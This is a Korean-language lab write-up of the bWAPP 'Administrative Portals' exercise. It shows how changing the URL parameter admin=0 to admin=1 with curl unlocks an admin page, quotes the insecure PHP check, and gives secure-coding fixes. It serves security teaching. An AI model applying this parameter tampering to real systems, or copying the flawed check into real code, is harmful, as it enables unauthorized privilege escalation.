# 웹 해킹 실습 교육: Session Mgmt. - Administrative Portals

> **교육 목적 전용 (For Educational Purposes Only)**  
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.  
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `192.168.0.146` (Kali Linux) |
| **실습 URL** | `http://192.168.0.20/bWAPP/smgmt_admin_portal.php?admin=0` |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 일시** | 2026-04-20 |

---

## 🎯 취약점 개요

### Administrative Portals (Insecure Direct Object References / Session Mgmt) 취약점이란?

이 취약점은 애플리케이션이 주요 기능(ex. 관리자 페이지 접근 권한)을 통제할 때, 서버 측 세션(Session) 데이터를 기반으로 검증하지 않고 **사용자가 직접 조작할 수 있는 매개변수**(URL 파라미터, 쿠키 등)에 의존하는 잘못된 설계로 인해 발생합니다.

해당 실습 페이지는 일반 사용자 계정(`bee`)으로는 잠겨있어야 할(Locked) 관리자 페이지를 권한 체크 없이 단순 URL 쿼리 파라미터(`?admin=0`)로만 판별합니다. 공격자는 이 값을 변조하는 것만으로 손쉽게 관리자 권한을 우회 및 획득(Privilege Escalation)할 수 있습니다.

### OWASP Top 10 분류
- **A01:2021** – Broken Access Control

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] 취약 페이지 (smgmt_admin_portal.php) 접근
        (권한 부족으로 'This page is locked.' 메시지 출력)
        │
        ▼
[2단계] 서버 요청 구조 분석 (파라미터 확인)
        (URL에 포함된 '?admin=0' 매개변수 식별)
        │
        ▼
[3단계] 파라미터 값 변조 및 서버 재요청 (권한 탈취)
        ('?admin=0' 을 '?admin=1' 로 조작하여 인증 우회)
        │
        ▼
[4단계] 관리자 권한 도메인(페이지) 접근 성공 확인
        ('Cowabunga... You unlocked this page' 출력 확인)
```

---

## 🛠️ 단계별 실습 (실제 실행 명령어)

### Step 1: 기본 권한 상태 확인 (접근 거부)

현재 `bee` 계정의 권한으로 해당 페이지(`smgmt_admin_portal.php`)에 정상 접근을 시도하여 상태를 확인합니다.

```bash
# 정상적인 파라미터(admin=0)로 요청 전송
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -c /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/smgmt_admin_portal.php?admin=0" | grep -i "locked"
```

**실행 결과:**
```html
<p><font color="red">This page is locked.</font><p>HINT: check the URL...</p></p>
```

> 💡 페이지 내에서 HINT로 제공하듯 URL을 확인하라는 메시지와 함께, 권한 없음(locked)으로 관리 기능이 차단된 것을 알 수 있습니다.

---

### Step 2: URL 쿼리 파라미터(Parameter) 변조 투입

URL의 쿼리 스트링(Query String)에 노출된 `admin=0` 값을 서버관리자(admin=1)를 뜻할 것으로 유추하여 `admin=1`로 변조 후 전송합니다.

```bash
# 악의적인 파라미터 조작(admin=1)으로 요청 전송
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -c /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/smgmt_admin_portal.php?admin=1" | grep -i "Cowabunga"
```

**실행 결과:**
```html
<p>Cowabunga...<p><font color="green">You unlocked this page using an URL manipulation.</font></p></p>
```

> 🚨 **취약점 작동 확인**: 일반 `bee` 계정 쿠키를 사용했음에도 오직 URL 파라미터를 넘긴 것만으로 서버 백엔드가 이를 관리자로 신뢰하고 `Unlocked` 화면(관리 기능 표출)을 노출하였습니다.

---

## 📊 공격 결과 요약

| 정보 유형 | 내용 |
|-----------|------------------|
| **조작 방식** | URL 파라미터 변조 단계 우회 (`admin=0` -> `admin=1`) |
| **취약점 영향** | 일반 사용자 인증만된 상태에서 **최고 관리자 권한 획득(수직적 권한 상승)** |
| **잠재적 위험** | 공격자가 실제 사이트의 백오피스(Back-Office) 및 관리자 페이지에 접근하여 서비스 전체 통제, 유저 DB 무단 수정 및 삭제 등이 가능해집니다. |

---

## 🛡️ 취약점 발생 원인 및 방어 기법

### 취약점 메커니즘
해당 PHP 백엔드에서는 권한을 판별할 때, 사용자가 임의 조작이 불가능한 서버 세션(`$_SESSION['admin_auth']`)을 사용하지 않고 오직 GET 인자(`$_GET['admin']`)로 넘어오는 값만을 조건비교 하여 통과시키고 있었습니다.

```php
// bWAPP의 취약한 권한 검증 로직 전문
if(isset($_GET["admin"])) {
    if($_GET["admin"] == "1") {
        $message = "Cowabunga... <font color=\"green\">You unlocked this page using an URL manipulation.</font>";
    } else {
        $message = "<font color=\"red\">This page is locked.</font>";
    }
}
```

### 방어(Secure Coding) 가이드

1. **서버 사이드 상태(Session) 변수를 통한 권한 저장 및 입증 ⭐️**
   관리자 권한, 계정 권한 등 중요한 상태는 절대로 URL Parameter, Hidden Field, 일반 Cookie(평문)에 담아 전달해선 안 됩니다. 
   사용자가 로그인할 때 DB의 정보와 대조하여 서버의 `Session` 객체 메모리에 안전하게 저장(`$_SESSION['role'] = 'admin'`) 하고 이 값을 통해 로직을 검증해야 합니다. 

2. **사용자 환경(Parameter)의 신뢰 단절**
   클라이언트 측에서 전송되는 모든 데이터(`POST`, `GET`, `Cookie`)는 언제는 프록시 툴(ex. Burp Suite)이나 브라우저 조작에 의해 위변조 될 수 있음을 가정하고 처리해야 합니다. 

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
> 허가받지 않은 환경에 해당 기술을 활용할 경우 **심각한 불법 행위**로 간주됩니다.
> 반드시 본인 소유 또는 적법한 동의를 얻은 환경 내에서 활용하십시오.

---

*작성일: 2026-04-20 | 실습 환경: Kali Linux + bWAPP Bee-Box | 작성: ngnicky-ai*
